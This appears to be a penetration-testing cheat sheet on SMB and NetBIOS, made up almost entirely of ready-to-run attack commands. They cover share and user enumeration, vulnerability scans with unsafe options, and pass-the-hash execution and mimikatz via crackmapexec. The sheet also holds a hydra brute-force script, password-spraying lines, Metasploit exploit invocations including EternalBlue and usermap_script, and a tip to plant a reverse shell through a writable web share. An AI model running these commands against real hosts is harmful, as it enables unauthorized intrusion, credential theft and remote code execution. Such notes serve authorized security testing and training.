## Scanning for the NetBIOS Service

	nmap -p 139,445 --open -oG smb.txt $ip
	
	nbtscan -r 192.168.1.0/24
	nbtscan -v [ip]

	rpcclient -N -U "" [ip]

## Checklist

1. Enumerate Hostname
2. List Shares
3. Check Null Sessions
4. Check for vulnerabilities
5. Overall scan
6. Manual inspection
7. List smb nmap scripts
8. Google to see if version is vulnerable

### Enumerate Hostname
	nmap --script smb-os-discovery [ip]
	nmap --script nbstat.nse [ip]

	nmblookup -A $ip
	nbtscan [ip]
	ping -a [ip]

### List Shares

	smbmap -H $ip

	echo exit | smbclient -L \\\\$ip

	$inmap --script smb-enum-shares -p 139,445 p

### Check Null Sessions

	nmap --script smb-enum-shares -p [ports] [ip]

	smbmap -H $ip
	smbmap -H [ip] -R [directory]
	
	rpcclient -U "" -N $ip
	rpcclient -U "" -N [ip]; netshareenum; netshareenumall
 
	 crackmapexec smb [ip] -u [user] -p [password] --shares

	smbclient -L -N [ip]
	smbclient \\\\$ip\\[share name]
	smbclient -L //10.10.10.3/ --option='client min protocol=NT1'
	# if getting error "protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED"

### Check for Vulnerabilities

	nmap --script smb-vuln* -p 139,445 $ip

### Overall Scan

	enum4linux -a $ip
	
	enum4linux -u 'guest' -p '' -a $ip

### Manual Inspection

	smbver.sh $ip (port)

### List smb nmap scripts

	locate .nse | grep smb
	nmap --script-help "smb*"
	nmap --script-help "smb*" and discovery

### Google to see if version is vulnerable

	SAMBA 3.x-4.x # vulnerable to linux/samba/is_known_pipename
	SAMBA 3.5.11 # vulnerable to linux/samba/is_known_pipename

## Nmap Script
### Get version
	nmap --script smb-os-discovery $ip

### Quick enum

	nmap --script=smb-enum* --script-args=unsafe=1 -T5 $ip

### Quick enum shares
	 nmap --script smb-enum-shares $ip
### Quick vuln scan

	nmap --script=smb-vuln* --script-args=unsafe=1 -T5 $ip

### Full enum and vuln scanning

	nmap --script=smb2-capabilities,smb-print-text,smb2-security-mode.nse,smb-protocols,smb2-time.nse,smb-psexec,smb2-vuln-uptime,smb-security-mode,smb-server-stats,smb-double-pulsar-backdoor,smb-system-info,smb-vuln-conficker,smb-enum-groups,smb-vuln-cve2009-3103,smb-enum-processes,smb-vuln-cve-2017-7494,smb-vuln-ms06-025,smb-enum-shares,smb-vuln-ms07-029,smb-enum-users,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-ls,smb-vuln-ms10-061,smb-vuln-ms17-010,smb-os-discovery --script-args=unsafe=1 -T5 $ip
	
	nmap -p139,445 -T4 -oN smb_vulns.txt -Pn --script 'not brute and not dos and smb-*' -vv -d $ip

### Vulnerable versions

- 1. Windows NT, 2000, and XP (most SMB1) - VULNERABLE: Null Sessions can be created by default
- 2. Windows 2003, and XP SP2 onwards - NOT VULNERABLE: Null Sessions can't be created default
- 3. Most Samba (Unix) servers

List of SMB versions and corresponding Windows versions:

- 1. SMB1 – Windows 2000, XP and Windows 2003. 

- 2. SMB2 – Windows Vista SP1 and Windows 2008

- 3. SMB2.1 – Windows 7 and Windows 2008 R2

- 4. SMB3 – Windows 8 and Windows 2012.


## Mount share in localhost
	mkdir /mnt/www
	mount -t  cifs //$ip/www /mtn/www (apt install cifs-util)
## CrackMapExec

	crackmapexec -u 'guest' -p '' --shares $ip
	
	crackmapexec -u 'guest' -p '' --rid-brute 4000 $ip
	
	crackmapexec -u 'guest' -p '' --users $ip
	
	crackmapexec smb [ip] -u [user] -p [password] --shares
	
	crackmapexec smb 192.168.1.0/24 -u Administrator -p P@ssw0rd
	
	crackmapexec smb 192.168.1.0/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B
	
	crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -M mimikatz 192.168.1.0/24
	
	crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -x whoami $ip
	
	crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B --exec-method smbexec -x whoami $ip# reliable pth code execution

## smbmap

### List Shares

	smbmap -H [ip]

### Recursively list dirs, and files

	smbmap -R $sharename -H $ip

Works well for listing and downloading files, and listing shares and permissions. Hashes work. Code execution don't work.

	smbmap -u '' -p '' -H $ip # similar to crackmapexec --shares
	
	smbmap -u guest -p '' -H $ip
	
	smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip
	
	smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -r # list top level dir
	
	smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -R # list everything recursively
	
	smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -s wwwroot -R -A '.*' # download everything recursively in the wwwroot share to /usr/share/smbmap. great when smbclient doesnt work
	
	smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H $ip -x whoami # no work

### Download all files

	smb: \> RECURSE ON
	
	smb: \> PROMPT OFF
	
	smb: \> mget *

### Downloads a file in quiet mode

	smbmap -R $sharename -H $ip -A $fileyouwanttodownload -q

## smbver.sh

	#!/bin/sh
	#Author: rewardone
	#Description:
	# Requires root or enough permissions to use tcpdump
	# Will listen for the first 7 packets of a null login
	# and grab the SMB Version
	#Notes:
	# Will sometimes not capture or will print multiple
	# lines. May need to run a second time for success.
	
	if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
	if [ ! -z $2 ]; then rport=$2; else rport=139; fi
	tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
	echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
	sleep 0.5 && echo ""

## smbenum.sh

	#!/bin/bash

	# smbenum 0.2 - This script will enumerate SMB using every tool in the arsenal
	
	# SECFORCE - Antonio Quina
	
	# All credits to Bernardo Damele A. G. <bernardo.damele@gmail.com> for the ms08-067_check.py script
	
	IFACE="eth0"
	
	if [ $# -eq 0 ]
	
	then
	
	echo "Usage: $0 <IP>"
	
	echo "eg: $0 10.10.10.10"
	
	exit
	
	else
	
	IP="$1"
	
	fi
	
	echo -e "\n########## Getting Netbios name ##########"
	
	nbtscan -v -h $IP
	
	echo -e "\n########## Checking for NULL sessions ##########"
	
	output=`bash -c "echo 'srvinfo' | rpcclient $IP -U%"`
	
	echo $output
	
	echo -e "\n########## Enumerating domains ##########"
	
	bash -c "echo 'enumdomains' | rpcclient $IP -U%"
	
	echo -e "\n########## Enumerating password and lockout policies ##########"
	
	polenum $IP
	
	echo -e "\n########## Enumerating users ##########"
	
	nmap -Pn -T4 -sS -p139,445 --script=smb-enum-users $IP
	
	bash -c "echo 'enumdomusers' | rpcclient $IP -U%"
	
	bash -c "echo 'enumdomusers' | rpcclient $IP -U%" | cut -d[ -f2 | cut -d] -f1 > /tmp/$IP-users.txt
	
	echo -e "\n########## Enumerating Administrators ##########"
	
	net rpc group members "Administrators" -I $IP -U%
	
	echo -e "\n########## Enumerating Domain Admins ##########"
	
	net rpc group members "Domain Admins" -I $IP -U%
	
	echo -e "\n########## Enumerating groups ##########"
	
	nmap -Pn -T4 -sS -p139,445 --script=smb-enum-groups $IP
	
	echo -e "\n########## Enumerating shares ##########"
	
	nmap -Pn -T4 -sS -p139,445 --script=smb-enum-shares $IP
	
	echo -e "\n########## Bruteforcing all users with 'password', blank and username as password"
	
	hydra -e ns -L /tmp/$IP-users.txt -p password $IP smb -t 1
	
	rm /tmp/$IP-users.txt

## Brute force login

	medusa -h $ip -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
	
	nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt $ip -vvvv

## Null Session

### Null session and extract information.

	nbtscan -r $ip

### Version

	msfconsole; use auxiliary/scanner/smb/smb_version; set RHOSTS $ip; run

### MultiExploit

	msfconsole; use exploit/multi/samba/usermap_script; set lhost 10.10.14.x; set rhost $ip; run


## Bruteforce password

	hydra -l administrator -P /usr/share/wordlists/rockyou.txt -t 1 $ip smb

## Connection

	smbclient -L 192.168.1.102
	
	smbclient //192.168.1.106/tmp
	
	smbclient \\\\192.168.1.105\\ipc$ -U john
	
	smbclient //192.168.1.105/ipc$ -U john

## Exploitation

- Gather version numbers
- Searchsploit
- Default Creds
- Creds previously gathered
- Download the software
### Username Map Script
Version 3.0.0-3.0.25rc3: CVE-2007-2447
	
	msf use exploit/multi/samba/usermap_script
### Symlink Directory Traversal
This reads the contents of a directory and writes it to the writable share

	msf use auxiliary/admin/smb/samba_symlink_tranversal metasploit module

Pre-requisites:
- Writable share
- "widelinks" parameter in smb.conf is set to "yes"

### Writable share associated with website
Upload a reverse shell to share and access it via website.

### Eternal Blue
	nmap -p 445 $ip --script=smb-vuln-ms17-010
	msf > use exploit/windows/smb/ms17_010_eternalblue
 **Vulnerable versions**: Windows 7, 8, 8.1 and Windows Server 2003/2008/2012(R2)/2016
 
